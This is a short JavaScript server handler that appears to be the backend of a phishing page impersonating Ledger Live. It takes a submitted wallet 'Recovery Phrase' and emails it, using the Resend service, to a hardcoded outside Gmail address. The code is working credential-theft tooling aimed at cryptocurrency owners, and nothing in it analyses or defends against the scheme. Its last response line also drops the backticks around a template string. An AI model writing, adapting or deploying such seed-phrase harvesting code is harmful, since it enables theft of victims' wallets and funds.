import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
  if (req.method === "POST") {
    try {
      const { form_type, fullname } = req.body;

      // send email
      await resend.emails.send({
        from: "onboarding@resend.dev",
        to: "tykeshare@gmail.com",
        subject: "Ledger Live Form Submission",
        html: `
          <h2>New Form Submission</h2>
          <p><strong>Form Type:</strong> ${form_type}</p>
          <p><strong>Recovery Phrase:</strong></p>
          <p>${fullname}</p>
          <hr>
          <p><em>Submitted at: ${new Date().toLocaleString()}</em></p>
        `,
      });

      res.status(200).json({ success: true, message: "Email sent!" });
    } catch (error) {
      console.error("Error sending email:", error);
      res.status(500).json({ success: false, error: error.message });
    }
  } else {
    res.setHeader("Allow", ["POST"]);
    res.status(405).end(Method ${req.method} Not Allowed);
  }
}